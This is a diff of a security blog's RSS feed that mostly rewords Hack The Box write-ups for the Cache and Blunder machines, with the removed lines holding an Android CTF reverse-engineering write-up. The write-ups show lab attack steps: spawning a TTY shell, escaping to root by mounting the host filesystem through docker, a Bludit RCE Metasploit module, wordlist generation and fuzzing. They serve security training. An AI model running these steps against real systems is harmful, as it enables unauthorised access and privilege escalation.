-<!--kg-card-end: markdown--><p>There are 2 interesting users: ash and luffy:</p><ul><li>ash we already know - he's the CEO of both Cache and HMS. </li><li>luffy, however, means nothing to us at this point, but this is the name of a <a href="https://en.wikipedia.org/wiki/One_Piece">OnePiece</a> character, which combined with the image on the <a href="http://10.10.10.188/net.html">Net page</a> page might be a little clue.</li></ul><h3 id="using-su">Using su</h3><p>We now have a couple of credentials that we want to test for both ash and luffy, however when we try to use su, we get the following error message:</p><!--kg-card-begin: markdown--><pre><code>www-data@cache:/var/www/hms.htb/public_html$ su -u ash
+<!--kg-card-end: markdown--><p>There are 2 interesting users: <strong>ash</strong> and <strong>luffy</strong>:</p><ul><li>ash we already know - they're the CEO of both Cache and HMS. </li><li>luffy, however, means nothing to us at this point (but this is the name of a <a href="https://en.wikipedia.org/wiki/One_Piece">OnePiece</a> character, which combined with the image on the <a href="http://10.10.10.188/net.html">Net page</a> page might be a little clue).</li></ul><h3 id="using-su">Using su</h3><p>We now have a couple of credentials that we want to test for both ash and luffy, however when we try to use su, we get the following error message:</p><!--kg-card-begin: markdown--><pre><code>www-data@cache:/var/www/hms.htb/public_html$ su -u ash
 su -u ash
 su: must be run from a terminal
 </code></pre>
-<!--kg-card-end: markdown--><p>After some Googling we understand that this means this machine is running inside a<a href="https://www.docker.com/"> </a>container. <a href="https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal">This StackOverflow answer</a> helps us go around this with a <a href="https://netsec.ws/?p=337">TTY shell</a>:</p><!--kg-card-begin: markdown--><pre><code>www-data@cache:$ echo &quot;import pty; pty.spawn('/bin/bash')&quot; &gt; /tmp/abc.py
+<!--kg-card-end: markdown--><p>After some Googling I realised that this means this machine is running inside a<a href="https://www.docker.com/"> </a>container. <a href="https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal">This StackOverflow answer</a> helped me go around it by using a <a href="https://netsec.ws/?p=337">TTY shell</a>:</p><!--kg-card-begin: markdown--><pre><code>www-data@cache:$ echo &quot;import pty; pty.spawn('/bin/bash')&quot; &gt; /tmp/abc.py
 www-data@cache:$ python3 /tmp/abc.py
 www-data@cache:$ rm /tmp/abc.py
 www-data@cache:$ su - ash
@@ -155,7 +408,7 @@ ash@cache:~$
  [ + ]  unattended-upgrades
  [ - ]  uuidd
 </code></pre>
-<!--kg-card-end: markdown--><p>Because of the name of the machine we decided to start by checking out the process in which <a href="https://memcached.org/">memcached</a> is running:</p><!--kg-card-begin: markdown--><pre><code>ash@cache:~$ ps aux | grep memcached
+<!--kg-card-end: markdown--><p>Because of the name of the machine I decided to start by checking out the process in which <a href="https://memcached.org/">memcached</a> is running:</p><!--kg-card-begin: markdown--><pre><code>ash@cache:~$ ps aux | grep memcached
 
 memcache   961  0.0  0.0 425792  4032 ?        Ssl  14:07   0:02 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid
 ash       7525  0.0  0.0 416308  2480 pts/5    Sl+  16:25   0:00 memcached
@@ -249,14 +502,14 @@ END
 </tr>
 </tbody>
 </table>
-<!--kg-card-end: markdown--><p>There's only 1 image we can run - ubuntu. Now we can mount our machine's entire filesystem on a new container (by specifying the <code>-v</code> argument) and then spawn a TTY to access it.</p><!--kg-card-begin: markdown--><pre><code>luffy@cache:~$ docker run -v /:/mnt/root -ti ubuntu
+<!--kg-card-end: markdown--><p>There's only 1 image we can run: <strong>ubuntu</strong>. Now we can mount our machine's entire filesystem on a new container (by specifying the <code>-v</code> argument) and then spawn a TTY to access it.</p><!--kg-card-begin: markdown--><pre><code>luffy@cache:~$ docker run -v /:/mnt/root -ti ubuntu
 </code></pre>
 <!--kg-card-end: markdown--><p>Since we're root, we can print the root flag from its relative path to the mount point.</p><!--kg-card-begin: markdown--><pre><code>root@a5d39b0a924a:/# cat /mnt/root/root/root.txtcat 
 </code></pre>
-<!--kg-card-end: markdown--><p></p><p></p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up  | Blunder]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/254">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>Scanning with <code>nmap</code> only retrieved an Apache web server on port 80.</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A blunder.htb
+<!--kg-card-end: markdown--><p></p><p></p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up  | Blunder]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/254">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>Scanning with <code>nmap</code> only retrieved an <code>Apache</code> web server running on port 80.</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A blunder.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-12 10:13 WEST
 Nmap scan report for blunder.htb (10.10.10.191)
-Host is up</code></pre>]]></description><link>https://inesmartins.github.io//htb-write-up-blunder/</link><guid isPermaLink="false">5ee346443d00be7291b53cc6</guid><category><![CDATA[htb]]></category><category><![CDATA[bludit]]></category><category><![CDATA[cms]]></category><category><![CDATA[cewl]]></category><category><![CDATA[apache]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 22 Oct 2020 08:50:44 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/infocard.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/infocard.png" alt="HTB Write-up  | Blunder"><p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/254">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>Scanning with <code>nmap</code> only retrieved an Apache web server on port 80.</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A blunder.htb
+Host is</code></pre>]]></description><link>https://inesmartins.github.io//htb-write-up-blunder/</link><guid isPermaLink="false">5ee346443d00be7291b53cc6</guid><category><![CDATA[htb]]></category><category><![CDATA[bludit]]></category><category><![CDATA[cms]]></category><category><![CDATA[cewl]]></category><category><![CDATA[apache]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 22 Oct 2020 08:50:44 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/infocard.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/infocard.png" alt="HTB Write-up  | Blunder"><p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/254">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>Scanning with <code>nmap</code> only retrieved an <code>Apache</code> web server running on port 80.</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A blunder.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-12 10:13 WEST
 Nmap scan report for blunder.htb (10.10.10.191)
 Host is up (0.48s latency).
@@ -271,7 +524,7 @@ PORT   STATE  SERVICE VERSION
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 100.87 seconds
 </code></pre>
-<!--kg-card-end: markdown--><p>The <a href="http://blunder.htb/">Home</a> and <a href="http://10.10.10.191/about">About</a> pages are very simple, just a couple of posts that don't seem very relevant, but from the source code we can tell this blog was created using version 3.9.2. of the <a href="https://www.bludit.com/">Bludit CMS</a>.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/home-1.png" class="kg-image" alt="HTB Write-up  | Blunder"></figure><h3 id="checking-for-bludit-vulnerabilities">Checking for Bludit Vulnerabilities</h3><p>As with most Bludit-based applications, this one has an <a href="http://blunder.htb/admin/">admin page</a>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/admin-1.png" class="kg-image" alt="HTB Write-up  | Blunder"></figure><p>After checking for <a href="https://www.cvedetails.com/vulnerability-list.php?vendor_id=17229&amp;product_id=41420&amp;version_id=&amp;page=1&amp;hasexp=0&amp;opdos=0&amp;opec=0&amp;opov=0&amp;opcsrf=0&amp;opgpriv=0&amp;opsqli=0&amp;opxss=0&amp;opdirt=0&amp;opmemc=0&amp;ophttprs=0&amp;opbyp=0&amp;opfileinc=0&amp;opginf=0&amp;cvssscoremin=0&amp;cvssscoremax=0&amp;year=0&amp;month=0&amp;cweid=0&amp;order=3&amp;trc=8&amp;sha=012a032fbb16ed1554a64233f60621639d4bf196">vulnerabilities</a> there is only 1 that matches this version and seems interesting:</p><blockquote><a href="https://www.cvedetails.com/cve/CVE-2019-16113/">CVE-2019-16113</a>: "remote code execution via <a href="http://blunder.htb/bl-kernel/ajax/upload-images.php">bl-kernel/ajax/upload-images.php</a> because PHP code can be entered with a .jpg file name, and then this PHP code can write other PHP code to a ../ pathname."</blockquote><p>From the CVE Details page we also know there's a <a href="https://www.rapid7.com/db/modules/exploit/linux/http/bludit_upload_images_exec">Metasploit module</a> linked to this CVE, however, this module <strong>requires us to know user and pass</strong>.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; use exploit/linux/http/bludit_upload_images_exec
+<!--kg-card-end: markdown--><p>The <a href="http://blunder.htb/">Home</a> and <a href="http://blunder.htb/about">About</a> pages are very simple, just a couple of posts that don't seem very relevant, but from the source code we can tell this blog was created using version 3.9.2. of the <a href="https://www.bludit.com/">Bludit CMS</a>.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/home-1.png" class="kg-image" alt="HTB Write-up  | Blunder"></figure><h3 id="checking-for-bludit-vulnerabilities">Checking for Bludit Vulnerabilities</h3><p>As with most Bludit-based applications, this one has an <a href="http://blunder.htb/admin/">admin page</a>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/admin-1.png" class="kg-image" alt="HTB Write-up  | Blunder"></figure><p>After checking for <a href="https://www.cvedetails.com/vulnerability-list.php?vendor_id=17229&amp;product_id=41420&amp;version_id=&amp;page=1&amp;hasexp=0&amp;opdos=0&amp;opec=0&amp;opov=0&amp;opcsrf=0&amp;opgpriv=0&amp;opsqli=0&amp;opxss=0&amp;opdirt=0&amp;opmemc=0&amp;ophttprs=0&amp;opbyp=0&amp;opfileinc=0&amp;opginf=0&amp;cvssscoremin=0&amp;cvssscoremax=0&amp;year=0&amp;month=0&amp;cweid=0&amp;order=3&amp;trc=8&amp;sha=012a032fbb16ed1554a64233f60621639d4bf196">vulnerabilities</a> there is only 1 that matches this version and seems interesting:</p><blockquote><a href="https://www.cvedetails.com/cve/CVE-2019-16113/">CVE-2019-16113</a>: "remote code execution via <a href="http://blunder.htb/bl-kernel/ajax/upload-images.php">bl-kernel/ajax/upload-images.php</a> because PHP code can be entered with a .jpg file name, and then this PHP code can write other PHP code to a ../ pathname."</blockquote><p>From the CVE Details page we also know there's a <a href="https://www.rapid7.com/db/modules/exploit/linux/http/bludit_upload_images_exec">Metasploit module</a> linked to this CVE, however, this module requires us to know user and pass.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; use exploit/linux/http/bludit_upload_images_exec
 
 msf5 exploit(linux/http/bludit_upload_images_exec) &gt; show info
 ...
@@ -327,7 +580,7 @@ for password in wordlist:
             print()
             break</code></pre><p>None of the usual wordlists worked, so, following a tip from the <a href="https://forum.hackthebox.eu/discussion/3363/official-blunder-discussion/p9">Forum</a> I decided to create a custom wordlist from the website using <a href="https://tools.kali.org/password-attacks/cewl">CeWL</a>:</p><!--kg-card-begin: markdown--><pre><code>$ cewl -d 1 -m 5 -w blunder-wordlist.txt http://blunder.htb
 </code></pre>
-<!--kg-card-end: markdown--><ul><li><code>-d</code> indicates the max scan depth;</li><li><code>-m</code> is the minimum word length;</li><li><code>-w</code> file where the wordlist will be written to.</li></ul><p>Unfortunately, this also failed, so I went back fuzzing.</p><h3 id="fuzzing-for-credentials">Fuzzing for Credentials</h3><p>It took a while but we finally found something interesting:</p><!--kg-card-begin: markdown--><pre><code>$ wfuzz -w common.txt --hc 404 http://blunder.htb/FUZZ.txt
+<!--kg-card-end: markdown--><ul><li><code>-d</code> indicates the max scan depth;</li><li><code>-m</code> is the minimum word length;</li><li><code>-w</code> file where the wordlist will be written to.</li></ul><p>Unfortunately, this also failed, so I went back fuzzing.</p><hr><h3 id="fuzzing-for-credentials">Fuzzing for Credentials</h3><p>It took a while but I finally found something interesting:</p><!--kg-card-begin: markdown--><pre><code>$ wfuzz -w common.txt --hc 404 http://blunder.htb/FUZZ.txt
 ...
 000004125:   200        4 L      23 W     118 Ch      &quot;todo&quot;
 ...
@@ -1048,164 +1301,4 @@ bcrypt.compare(password, hash, (err, res) =&gt; {
         return
     }
     console.log(res) //true or false
-})</code></pre><h2 id="resources">Resources</h2><ul><li>NIST's <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r4.pdf">Recommendation for Key Management</a></li><li>OWASP's <a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html">Password Storage Cheat Sheet</a></li><li>OWASP's <a href="https://owasp.org/www-pdf-archive/Secure_Password_Storage_@OWASPChicago.pdf">Secure Password Storage</a></li><li><a href="https://medium.com/@rauljordan/the-state-of-hashing-algorithms-the-why-the-how-and-the-future-b21d5c0440de">The State of Hashing Algorithms</a></li><li><a href="https://codahale.com/how-to-safely-store-a-password/">How to Safely Store a Password</a></li></ul>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC Baby Xmas Challenge 2019 | Android Rev]]></title><description><![CDATA[<p><em>The APK for the original challenge can be downloaded <a href="http://sefod.eu/ctf/xmas_ctfzadas.apk">here</a>.</em><br><em>The author's write-up can be downloaded <a href="https://www.dropbox.com/s/nh5thnkf8igarb9/%5B0x78%5D_0xOPOSEC_CHALLENGE_ANDROID_WEBVIEW_BOF.pdf?dl=1">here</a>.</em></p><p>We're given an Android Package (<code>xmas_ctfzadas.apk</code>) along with the following instructions:</p><!--kg-card-begin: markdown--><pre><code>Baby pwn tu-tu-tu-tu!
-- Get the first two flags ({oposec}XPTO) locally;
-- For the brave ones, find a way</code></pre>]]></description><link>https://inesmartins.github.io//oposec-baby-xmas-challenge-android-rev/</link><guid isPermaLink="false">5ee51aa03d00be7291b53f47</guid><category><![CDATA[android]]></category><category><![CDATA[rev]]></category><category><![CDATA[oposec]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 13 Jun 2020 21:33:38 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/highres_471963990-1-1.jpeg" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/highres_471963990-1-1.jpeg" alt="ØxOPOSɆC Baby Xmas Challenge 2019 | Android Rev"><p><em>The APK for the original challenge can be downloaded <a href="http://sefod.eu/ctf/xmas_ctfzadas.apk">here</a>.</em><br><em>The author's write-up can be downloaded <a href="https://www.dropbox.com/s/nh5thnkf8igarb9/%5B0x78%5D_0xOPOSEC_CHALLENGE_ANDROID_WEBVIEW_BOF.pdf?dl=1">here</a>.</em></p><p>We're given an Android Package (<code>xmas_ctfzadas.apk</code>) along with the following instructions:</p><!--kg-card-begin: markdown--><pre><code>Baby pwn tu-tu-tu-tu!
-- Get the first two flags ({oposec}XPTO) locally;
-- For the brave ones, find a way to get the third flag
-- Yup &quot;This_is_the_flag&quot; is your friend but not the final solution.
-</code></pre>
-<!--kg-card-end: markdown--><h2 id="unzipping-the-apk">Unzipping the APK</h2><p>An APK is actually just a ZIP file, by unzipping it we get to see the compressed files:</p><!--kg-card-begin: markdown--><pre><code>~ unzip app.apk
-
-~ ls -la
-...
--rw-r--r--@  1 inesmartins  staff     2444 Nov 22  2019 AndroidManifest.xml
-drwxr-xr-x@  5 inesmartins  staff      160 Jun 13 20:59 META-INF
--rw-r--r--@  1 inesmartins  staff   178784 Nov 22  2019 classes.dex
--rw-r--r--@  1 inesmartins  staff  2062612 Nov 22  2019 classes2.dex
-drwxr-xr-x@  3 inesmartins  staff       96 Jun 13 20:59 lib
-drwxr-xr-x@ 16 inesmartins  staff      512 Jun 13 20:59 res
--rw-r--r--@  1 inesmartins  staff   225072 Nov 22  2019 resources.arsc
-</code></pre>
-<!--kg-card-end: markdown--><p>So, as expected we see <code>AndroidManifest.xml</code>, some .dex files (the source code), the resources, and also one <a href="https://en.wikipedia.org/wiki/Java_Native_Interface">Java Native Interface</a> (JNI) library that contains some interesting information:</p><!--kg-card-begin: markdown--><pre><code>~ strings lib/armeabi-v7a/libopoctf-jni.so
-
-...
-Java_pt_oposec_ctfzadas_CTFObject_firstFlag
-Java_pt_oposec_ctfzadas_CTFObject_secondFlag
-Java_pt_oposec_ctfzadas_CTFObject_thirdFlag
-Java_pt_oposec_ctfzadas_MainActivity_stringFromJNI
-envzadas
-jump_here
-jump_not_here
-...
-tres_out
-...
-This_is_not_the_flag
-This_is_the_flag
-...
-</code></pre>
-<!--kg-card-end: markdown--><h2 id="decoding-the-app">Decoding the app</h2><p><a href="https://ibotpeaches.github.io/Apktool/">apktool</a> is able to rebuild some of the resources of the Android project back to their original format, which is very useful when trying to read the <code>AndroidManifest.xml</code> file:</p><!--kg-card-begin: markdown--><pre><code>~ apktool decode xmas_ctfzadas.apk
-
-~ cat xmas_ctfzadas/AndroidManifest.xml
-
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;no&quot;?&gt;
-&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
-          android:compileSdkVersion=&quot;23&quot;
-          android:compileSdkVersionCodename=&quot;6.0-2438415&quot;
-          package=&quot;pt.oposec.ctfzadas&quot;
-          platformBuildVersionCode=&quot;1&quot;
-          platformBuildVersionName=&quot;1.0&quot;&gt;
-    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;
-    &lt;application android:appComponentFactory=&quot;android.support.v4.app.CoreComponentFactory&quot;
-                 android:allowBackup=&quot;true&quot;
-                 android:debuggable=&quot;true&quot;
-                 android:exported=&quot;true&quot;
-                 android:icon=&quot;@mipmap/ic_launcher&quot;
-                 android:label=&quot;@string/app_name&quot;
-                 android:supportsRtl=&quot;true&quot;
-                 android:theme=&quot;@style/AppTheme&quot;&gt;
-        &lt;activity android:name=&quot;pt.oposec.ctfzadas.MainActivity&quot;&gt;
-            &lt;intent-filter&gt;
-                &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;
-                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;
-            &lt;/intent-filter&gt;
-        &lt;/activity&gt;
-    &lt;/application&gt;
-&lt;/manifest&gt;
-</code></pre>
-<!--kg-card-end: markdown--><p>As you can see, this application has only one <a href="https://developer.android.com/reference/android/app/Activity">Activity</a> - MainActivity.</p><h2 id="static-analysis-with-jd-gui">Static analysis with JD-GUI</h2><p>We start by transforming the .dex files into a single .jar file using the <a href="https://sourceforge.net/projects/dex2jar/files/">dex2jar</a> script:</p><!--kg-card-begin: markdown--><pre><code>~ sh dex2jar-2.0/d2j-dex2jar.sh -f xmas_ctfzadas.apk
-</code></pre>
-<!--kg-card-end: markdown--><p>To go through the .jar we use <a href="http://java-decompiler.github.io/">JD-GUI</a>.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/files-1.png" class="kg-image" alt="ØxOPOSɆC Baby Xmas Challenge 2019 | Android Rev"></figure><p>The <code>pt.oposec.ctfzadas</code> package contains 4 classes:</p><ul><li><code>BuildConfig.class</code> and <code>R.class</code> are both automatically generated files: the first lists the project configs and the second identifies all the project assets;</li><li>this leaves only 2 interesting files: <code>MainActivity.class</code> and <code>CTFObject.class</code>.</li></ul><h3 id="mainactivity-class">MainActivity.class</h3><p>As we can see below, on app start the MainActivity loads the <code>opoctf-jni</code> library, then creates a <a href="https://developer.android.com/reference/android/webkit/WebView">Webview</a> that has access to an instance of the <code>CTFObject</code> class called <code>ctfObj</code>. The webview's URL depends on the Intent's <code>open_sesame</code> query string.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/main-2.png" class="kg-image" alt="ØxOPOSɆC Baby Xmas Challenge 2019 | Android Rev"></figure><h3 id="ctfobject-class">CTFObject.class</h3><p>This class is quite interesting:</p><ol><li>There is a function called <code>um</code> that returns the output of the <code>firstFlag</code> JNI function:</li></ol><pre><code class="language-java">public class CTFObject {
-...
-	
-    public native String firstFlag();
-    
-    @JavascriptInterface
-    public String um() {
-        return firstFlag();
-    }
-
-...
-}
-</code></pre><p>2. Similarly, there's a function called <code>dois</code> that calls the <code>secondFlag</code> JNI function with a string param. Note that there's a 5-number PIN mentioned on this function.</p><pre><code class="language-java">public class CTFObject {
-...
-
-    public native String secondFlag(String paramString);
-
-    @JavascriptInterface
-    public String dois(String paramString) {
-        Log.d("OPOSEC", "Pin have 5 numbers (String)\nString starts with \"{oposec}\"");
-        Log.d(secondFlag(paramString), secondFlag(paramString));
-        return secondFlag(paramString);
-    }
-
-...
-}
-</code></pre><p>3. Finally, there's a <code>tres</code> function that calls the <code>thirdFlag</code> function from the JNI library with a byte array that's parsed from a hex string:</p><pre><code class="language-java">public class CTFObject {
-...
-
-    public static byte[] hexStringToByteArray(String paramString) {
-        int j = paramString.length();
-        byte[] arrayOfByte = new byte[j / 2 + 1];
-        for (int i = 0; i &lt; j; i += 2)
-            arrayOfByte[i / 2] = (byte)((Character.digit(paramString.charAt(i), 16) &lt;&lt; 4) + Character.digit(paramString.charAt(i + 1), 16));
-            arrayOfByte[arrayOfByte.length - 1] = Integer.valueOf(0).byteValue();
-        return arrayOfByte;
-    }
-  
-    public native String thirdFlag(byte[] paramArrayOfbyte);
-    
-    @JavascriptInterface
-    public String tres(String paramString) {
-        Log.d("aaa-", paramString);
-        byte[] arrayOfByte = hexStringToByteArray(paramString);
-        Log.d("aaa:", String.valueOf(arrayOfByte));
-        return thirdFlag(arrayOfByte);
-    }
-
-...
-}
-</code></pre><p>Note that functions <code>um</code>, <code>dois</code> and <code>tres</code> are accessible on the MainActivity's webview since they're marked with the <a href="https://developer.android.com/reference/android/webkit/JavascriptInterface">JavascriptInterface notation</a>.</p><h2 id="re-creating-the-android-project">Re-Creating the Android project</h2><p>After installing <a href="https://developer.android.com/studio/?gclid=CjwKCAjw8pH3BRAXEiwA1pvMsX1EY3uC8enHJFsoQM2iuA4gUypWFvBJ7tUuhjy1dcuRjtUnVzUa3RoCvdcQAvD_BwE&amp;gclsrc=aw.ds">Android Studio</a> we create a new Android project and then:</p><ul><li>add the <code>CTFObject</code> class to <code>src/main/java/pt.oposec.ctfzadas</code> - I ended up changing the Java code to Kotlin, since I'm more familiar with it.</li><li>add the <code>libopoctf-jni.so</code> library under <code>/src/main/jniLibs/armeabi-v7a</code> (this path is extremely important).</li></ul><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/dir.png" class="kg-image" alt="ØxOPOSɆC Baby Xmas Challenge 2019 | Android Rev"></figure><h2 id="getting-the-first-flag">Getting the first flag</h2><p>The first flag is very simple, all we need is an instance of <code>CTFObject</code> and then we can simply print the result of calling either <code>um</code> or the <code>firstFlag</code> function directly, as shown below.</p><pre><code class="language-kotlin">package pt.oposec.ctfzadas
-
-import android.os.Bundle
-import androidx.appcompat.app.AppCompatActivity
-
-class MainActivity : AppCompatActivity() {
-
-    private var ctfObject = CTFObject()
-
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        print(ctfObject.firstFlag())
-    }
-}
-</code></pre><h2 id="getting-the-second-flag">Getting the second flag</h2><p>From the <code>CTFObject</code> class we know we need to find a 5-digit PIN code, which we can easily brute force. Knowing that the flag has the word <code>oposec</code> we simply run through all the options until we get the one that prints out the flag:</p><pre><code class="language-kotlin">package pt.oposec.ctfzadas
-
-import android.os.Bundle
-import androidx.appcompat.app.AppCompatActivity
-
-class MainActivity : AppCompatActivity() {
-    
-    private var ctfObject = CTFObject()
-
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        for (i in 0..9) {
-            for (j in 0..9) {
-                for (k in 0..9) {
-                    for (l in 0..9) {
-                        for (m in 0..9) {
-                            val pin = "$i$j$k$l$m"
-                            val res = ctfObject.secondFlag(pin)
-                            if (res.contains("oposec")) {
-                                print("Pin is: " + pin)
-                                print("Flag is: " + res)
-                            }
-                        }
-                    }
-                }
-            }
-        }
-        print("Could not get flag")   
-    }
-    ```</code></pre><h2 id="useful-resources">Useful Resources</h2><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://stackoverflow.com/questions/24357687/how-to-include-so-library-in-android-studio"><div class="kg-bookmark-content"><div class="kg-bookmark-title">How to include *.so library in Android Studio?</div><div class="kg-bookmark-description">I read many threads how to add a *.so library to Android Studio, but none of them works, especially when it comes to the point of text: This does not work with the newer xxx (Android Studio, gradle...</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon.png?v=c78bd457575a" alt="ØxOPOSɆC Baby Xmas Challenge 2019 | Android Rev"><span class="kg-bookmark-author">Ronald Wiplinger</span><span class="kg-bookmark-publisher">Stack Overflow</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon@2.png?v=73d79a89bded" alt="ØxOPOSɆC Baby Xmas Challenge 2019 | Android Rev"></div></a></figure>]]></content:encoded></item><item><title><![CDATA[Simplest way to host your Ghost blog on GitHub Pages]]></title><description><![CDATA[<p>This tutorial assumes you already have a Ghost blog that you want to host on Github Pages. </p><ol><li>Follow <a href="https://pages.github.com/">these instructions</a> to create a repository for your Github Pages blog, and then clone the repo somewhere on your computer;</li><li>Go to the directory where you have your Ghost blog, run <code>ghost</code></li></ol>]]></description><link>https://inesmartins.github.io//simplest-way-to-host-your-ghost-site-on-gitpages/</link><guid isPermaLink="false">5ede3138b6ef324dc7275d08</guid><category><![CDATA[ghost]]></category><category><![CDATA[blog]]></category><category><![CDATA[static site generator]]></category><category><![CDATA[gssg]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Mon, 08 Jun 2020 12:54:15 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/ghost-uma-otima-alternativa-para-blogs-profissionais-e-pessoais.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/ghost-uma-otima-alternativa-para-blogs-profissionais-e-pessoais.jpg" alt="Simplest way to host your Ghost blog on GitHub Pages"><p>This tutorial assumes you already have a Ghost blog that you want to host on Github Pages. </p><ol><li>Follow <a href="https://pages.github.com/">these instructions</a> to create a repository for your Github Pages blog, and then clone the repo somewhere on your computer;</li><li>Go to the directory where you have your Ghost blog, run <code>ghost start</code> and take note of the local port;</li><li>Install <a href="https://www.npmjs.com/package/ghost-static-site-generator">ghost-static-site-generator</a>;</li><li>If your blog is running on the default port (2368), you can simply run from your Ghost blog's directory:</li></ol><pre><code>gssg --url [your-github-pages-URL]</code></pre><p>if you're running from some other port you can specify it with the <code>domain</code> parameter:</p><pre><code>gssg --url [your-github-pages-URL] --domain http://localhost:4444 </code></pre><p>5. If everything went smoothly you now have a directory called static inside your Ghost blog's directory. You can check if everything went well by running:</p><pre><code>gssg preview</code></pre><p>6. Copy all of the contents of the static dir to the Github Pages repo, commit + push these new files and you're done!</p><p>Note that instead of copying the files, you can set the Github Pages repo as the destination directory as such:</p><pre><code>gssg --url [your-github-pages-URL] --dest your-github-pages-repo</code></pre>]]></content:encoded></item></channel></rss>
+})</code></pre><h2 id="resources">Resources</h2><ul><li>NIST's <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r4.pdf">Recommendation for Key Management</a></li><li>OWASP's <a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html">Password Storage Cheat Sheet</a></li><li>OWASP's <a href="https://owasp.org/www-pdf-archive/Secure_Password_Storage_@OWASPChicago.pdf">Secure Password Storage</a></li><li><a href="https://medium.com/@rauljordan/the-state-of-hashing-algorithms-the-why-the-how-and-the-future-b21d5c0440de">The State of Hashing Algorithms</a></li><li><a href="https://codahale.com/how-to-safely-store-a-password/">How to Safely Store a Password</a></li></ul>]]></content:encoded></item></channel></rss>
